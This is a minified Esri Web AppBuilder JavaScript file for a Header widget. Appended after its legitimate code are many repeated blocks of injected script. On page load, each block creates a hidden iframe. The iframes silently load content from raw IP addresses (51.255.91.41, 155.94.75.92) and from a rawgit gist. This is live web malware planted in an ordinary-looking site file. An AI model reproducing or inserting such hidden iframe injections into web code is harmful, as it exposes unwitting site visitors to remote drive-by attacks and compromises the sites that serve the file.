// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"themes/LaunchpadTheme/widgets/Header/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:themes/LaunchpadTheme/widgets/Header/Widget.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"logo jimu-float-leading" data-dojo-attach-point\x3d"logoWrapperNode"\x3e\r\n    \x3ca data-dojo-attach-point\x3d"logoLinkNode" target\x3d"_blank"\x3e\r\n     \x3cimg data-dojo-attach-point\x3d"logoNode"\x3e\r\n    \x3c/a\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"titles jimu-float-leading jimu-leading-margin1" data-dojo-attach-point\x3d"titlesNode"\x3e\r\n    \x3cdiv class\x3d"jimu-title jimu-float-leading" data-dojo-attach-point\x3d"titleNode"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-subtitle jimu-float-leading jimu-leading-margin2" data-dojo-attach-point\x3d"subtitleNode"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cspan class\x3d"links-icon" data-dojo-attach-point\x3d"linksIconNode"\x3e\r\n    \x3cimg data-dojo-attach-point\x3d"linksIconImageNode"\x3e\r\n    \x3cdiv class\x3d"links hidden" data-dojo-attach-point\x3d"linksNode"\x3e\r\n      \x3cspan class\x3d"dynamic-section" data-dojo-attach-point\x3d"dynamicLinksNode"\x3e\x3c/span\x3e\r\n      \x3ca class\x3d"link" href\x3d"#" data-dojo-attach-point\x3d"aboutNode" data-dojo-attach-event\x3d"onclick:_onAboutClick"\x3e${nls.about}\x3c/a\x3e\r\n    \x3c/div\x3e\r\n  \x3c/span\x3e\r\n\x3c/div\x3e',
"url:themes/LaunchpadTheme/widgets/Header/css/style.css":".jimu-widget-header .header-section{height: 100%; float: left;}.jimu-widget-header .container-section{height: 100%; float: left;}.jimu-widget-header .hide-logo{display: none;}.jimu-widget-header .logo {padding: 0 10px;}.jimu-widget-header .logo img {margin: 0 auto; max-height: 40px;}.jimu-widget-header .titles{height: 100%;}.jimu-widget-header .jimu-title{text-align: center; height: 100%;}.jimu-widget-header .jimu-subtitle{text-align: center; height: 100%;}.jimu-widget-header .links{position: absolute; background-color: #fff;}.jimu-widget-header .links.hidden {display: none;}.jimu-widget-header .links-icon{margin: 10px; padding: 5px; position: absolute; right: 0; cursor: pointer;}.jimu-rtl .jimu-widget-header .links-icon{right: auto; left: 0;}.jimu-widget-header .links-icon img{width: 16px;}.jimu-widget-header .links .link{height: 100%; display: block;}.jimu-rtl .jimu-widget-header .links .link{margin-left: auto;}.jimu-widget-header .signin-section .link{color: #d9dde0;}.jimu-widget-header .group-icon-node{float: right; cursor: pointer; opacity: 0.4; text-align: center; border-right: 1px solid #323e4f;}.jimu-widget-header .group-icon-node:first-child{border: none;}.jimu-widget-header .group-icon-node:hover{opacity: 1;}.jimu-widget-header .group-icon-node.jimu-state-selected{background-color: #697a8c; opacity: 1; border: none; border-top: 2px solid #8491a1;}.popup-links{background-color: #252824;}.popup-links .popup-title{}.popup-links .title{color:#fff; text-align: center; font-size: 24px;}.popup-links .line{width: 100%; height: 4px; border-top: 1px solid #14161a; border-bottom: 1px solid #393c40;}.popup-links .link-section{width: 100%; height: 66px; background-color: #252824;}.popup-links a{color: #6d7685; margin-left: 20px; font-size: 14px; height: 100%; width: 95%; display: inline-block;}.jimu-rtl .popup-links a {margin-right: 20px; margin-left: auto;}.popup-links .link-section.signin a{color: #d9dde0;}",
"*now":function(k){k(['dojo/i18n!*preload*themes/LaunchpadTheme/widgets/Header/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/dom-class dojo/_base/window dojo/window dojo/query dojo/on dojo/Deferred jimu/BaseWidget jimu/WidgetManager jimu/LayoutManager jimu/utils dojo/NodeList-dom dojo/NodeList-manipulate".split(" "),function(k,e,m,b,n,g,p,l,h,q,r,t,u,f){return k([r],{baseClass:"jimu-widget-header jimu-main-background",name:"Header",switchableElements:{},_boxSizes:null,moveTopOnActive:!1,constructor:function(){this.height=this.getHeaderHeight()+
"px";this.widgetManager=t.getInstance();this.LayoutManager=u.getInstance()},postCreate:function(){this.inherited(arguments);this.own(h(this.widgetManager,"widget-created",e.hitch(this,function(a){"Search"===a.name&&(a=this._getSearchWidgetInHeader())&&(b.addClass(a.domNode,"has-transition"),a&&!a.searchDijit?this._searchDijitDomReady(a).then(e.hitch(this,function(){this.resize()})):this.resize())})));this.own(h(this.widgetManager,"widget-destroyed",e.hitch(this,function(a){a&&0<=a.indexOf("Search")&&
this.resize()})));var a=this.getLogoWidth()+"px";this.position&&this.position.height&&(this.height=this.position.height);this.switchableElements.logo=l(".logo",this.domNode);this.switchableElements.title=l(".jimu-title",this.domNode);this.switchableElements.subtitle=l(".jimu-subtitle",this.domNode);this._handleTitleColorAndLogoLink(this.appConfig);this.switchableElements.logo.style({height:a});this._setElementsSize()},_getSearchWidgetInHeader:function(){var a,b=this.widgetManager.getWidgetsByName("Search");
m.some(b,function(b){if(!b.closeable&&b.isOnScreen)return a=b,!0});return a},startup:function(){this.inherited(arguments);this.appConfig&&this.appConfig.logo?(this.logoNode.src=this.appConfig.logo,this.own(h(this.logoNode,"load",e.hitch(this,function(){this._boxSizes.logoBox=b.getMarginSize(this.logoWrapperNode);this.resize()}))),b.removeClass(this.logoWrapperNode,"hide-logo")):(this.logoNode.src="",b.addClass(this.logoWrapperNode,"hide-logo"));this.switchableElements.title.innerHTML(f.sanitizeHTML(this.appConfig.title?
this.appConfig.title:""));this.switchableElements.subtitle.innerHTML(f.sanitizeHTML(this.appConfig.subtitle?this.appConfig.subtitle:""));this._createDynamicLinks(this.appConfig.links);this.appConfig.about?b.setStyle(this.aboutNode,"display",""):b.setStyle(this.aboutNode,"display","none");this._determineLinksButtonVisibility(this.appConfig.links);this._updateBoxsizes();this.resize()},_searchDijitDomReady:function(a){var b=0,d=new q,v=setInterval(e.hitch(this,function(){5E3<b||a.searchDijit?(clearInterval(v),
d.resolve()):b+=200}),200);return d},onAppConfigChanged:function(a,b,d){switch(b){case "attributeChange":this._onAttributeChange(a,d);this._updateBoxsizes();this.resize();break;case "widgetChange":"Search"===d.name&&this.resize();break;default:return}this.appConfig=a},_onAttributeChange:function(a,c){"title"in c&&c.title!==this.appConfig.title&&(this.switchableElements.title.innerHTML(f.sanitizeHTML(c.title)),b.setStyle(this.titleNode,{display:c.title?"":"none"}));"subtitle"in c&&c.subtitle!==this.appConfig.subtitle&&
(this.switchableElements.subtitle.innerHTML(f.sanitizeHTML(c.subtitle)),b.setStyle(this.subtitleNode,{display:c.subtitle?"":"none"}));"none"===b.getStyle(this.titleNode,"display")&&"none"===b.getStyle(this.subtitleNode,"display")||b.setStyle(this.titlesNode,"width","1000px");"logo"in c&&c.logo!==this.appConfig.logo&&(c.logo?(b.setAttr(this.logoNode,"src",c.logo),b.removeClass(this.logoWrapperNode,"hide-logo")):(b.removeAttr(this.logoNode,"src"),b.addClass(this.logoWrapperNode,"hide-logo")));"links"in
c&&(this._createDynamicLinks(c.links),this._determineLinksButtonVisibility(c.links));this._handleTitleColorAndLogoLink(a)},_handleTitleColorAndLogoLink:function(a){a.titleColor?b.setStyle(this.switchableElements.title,"color",a.titleColor):b.setStyle(this.switchableElements.title,"color","");a.logoLink?(b.setAttr(this.logoLinkNode,"href",a.logoLink),b.setStyle(this.logoNode,"cursor","pointer")):(b.setAttr(this.logoLinkNode,"href","javascript:void(0)"),b.setStyle(this.logoNode,"cursor","default"))},
_setElementsSize:function(){b.setStyle(this.logoNode,{height:"30px",marginTop:(this.getLogoWidth()-30)/2+"px"});b.setStyle(this.titleNode,{lineHeight:this.height+"px"});b.setStyle(this.subtitleNode,{lineHeight:this.height+"px"})},_createDynamicLinks:function(a){b.empty(this.dynamicLinksNode);m.forEach(a,function(a){b.create("a",{href:a.url,target:"_blank",rel:"noopener noreferrer",innerHTML:f.sanitizeHTML(a.label),"class":"link"},this.dynamicLinksNode)},this)},_determineLinksButtonVisibility:function(a){a.length||
this.appConfig.about?this._showLinksIcon():this._hideLinksIcon()},_showLinksIcon:function(){b.setAttr(this.linksIconImageNode,"src",this.folderUrl+"images/link_icon.png");b.setStyle(this.linksIconNode,"display","block");b.addClass(g.body(),"header-has-links");var a=this.domNode.clientWidth+this.getLinksWidth();b.setStyle(this.domNode,"width",a+"px");this.linksIconClicked||(this.linksIconClicked=h(this.linksIconNode,"click",e.hitch(this,function(){this._toggleLinksMenu()})))},_hideLinksIcon:function(){b.setStyle(this.linksIconNode,
"display","none");b.removeClass(g.body(),"header-has-links")},_toggleLinksMenu:function(){b.toggleClass(this.linksNode,"hidden")},_onAboutClick:function(){this.widgetManager.loadWidget({id:this.appConfig.about+"_1",uri:this.appConfig.about,label:"About"}).then(e.hitch(this,function(a){b.place(a.domNode,jimuConfig.layoutId);a.startup()}))},_updateBoxsizes:function(){var a={w:0,h:0};"none"!==b.getStyle(this.logoWrapperNode,"display")&&(a=b.getMarginSize(this.logoWrapperNode));var c={w:0,h:0};"none"!==
b.getStyle(this.titleNode,"display")?(this.switchableElements.title.innerHTML()&&(c=b.getMarginSize(this.titleNode)),n.add(this.subtitleNode,"jimu-leading-margin2")):n.remove(this.subtitleNode,"jimu-leading-margin2");var d={w:0,h:0};"none"!==b.getStyle(this.subtitleNode,"display")&&this.switchableElements.subtitle.innerHTML()&&(d=b.getMarginSize(this.subtitleNode));b.setStyle(this.titlesNode,"width",c.w+d.w+2+"px");var e={l:0,t:0,w:0,h:0};"none"!==this.linksIconNode.style.display&&(e=b.getMarginSize(this.linksIconNode));
this._boxSizes={logoBox:a,titleBox:c,subTitleBox:d,searchWidgetBox:{l:0,t:0,w:0,h:0},LinksIconBox:e}},setPosition:function(a,c){this.position=a;var d=f.getPositionStyle(this.position);d.position="absolute";c||(c="map"===a.relativeTo?this.map.id:window.jimuConfig.layoutId);b.place(this.domNode,c);b.setStyle(this.domNode,d);this.started&&setTimeout(e.hitch(this,this.resize),200)},resize:function(){if(this._started){var a=this._boxSizes;if(window.appInfo.isRunInMobile)b.addClass(g.body(),"is-mobile");
else{b.removeClass(g.body(),"is-mobile");var c=p.getBox(),d=this._getSearchWidgetInHeader();a.searchWidgetBox=d?b.getMarginSize(d.domNode):{w:0,h:0};var e=20,f=a.logoBox.w+a.titleBox.w+a.subTitleBox.w+a.searchWidgetBox.w+a.LinksIconBox.w;if(f===a.logoBox.w||f===a.LinksIconBox.w)e=0;f+=e;15+f+250<c.w?(this.domNode.style.width=f+"px",c=20,0===a.titleBox.w+a.subTitleBox.w&&(c=15),d&&(window.isRTL?d.domNode.style.right=a.logoBox.w+a.titleBox.w+a.subTitleBox.w+15+c+"px":d.domNode.style.left=a.logoBox.w+
a.titleBox.w+a.subTitleBox.w+15+c+"px"),this.titleNode.style.visibility="visible",this.subtitleNode.style.visibility="visible"):(15+f-a.subTitleBox.w+250<c.w?(c=a.logoBox.w+10+a.searchWidgetBox.w+a.titleBox.w+a.LinksIconBox.w,this.domNode.style.width=c+"px",d&&(a=15+c-a.LinksIconBox.w-a.searchWidgetBox.w,window.isRTL?d.domNode.style.right=a+10+"px":d.domNode.style.left=a+10+"px"),this.titleNode.style.visibility="visible"):(c=a.logoBox.w+10+a.searchWidgetBox.w+a.LinksIconBox.w,this.domNode.style.width=
c+"px",d&&(window.isRTL?d.domNode.style.right=15+a.logoBox.w+10+"px":d.domNode.style.left=15+a.logoBox.w+10+"px"),this.titleNode.style.visibility="hidden"),this.subtitleNode.style.visibility="hidden")}}},getHeaderHeight:function(){return 44},getLogoWidth:function(){return 50},getLinksWidth:function(){return 36},destroy:function(){this.inherited(arguments)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});